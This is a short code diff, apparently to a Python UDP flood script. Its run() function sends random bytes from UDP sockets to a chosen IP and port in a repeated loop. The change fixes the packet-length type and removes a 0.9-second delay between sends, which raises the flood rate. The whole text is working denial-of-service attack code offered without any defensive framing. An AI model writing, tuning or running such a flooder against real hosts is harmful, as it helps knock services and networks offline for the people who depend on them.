@@ -21,10 +21,10 @@ def run():
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			i = random.choice(length_string)
+			length = int(i)
 			addr = (str(ip),int(port))
-			data2 = random._urandom(i)
+			data2 = random._urandom(length)
 			s2.sendto(data2,addr)
-			time.sleep(.9)
 			s2.close()
 			for x in range(times):
 				s.sendto(data,addr)
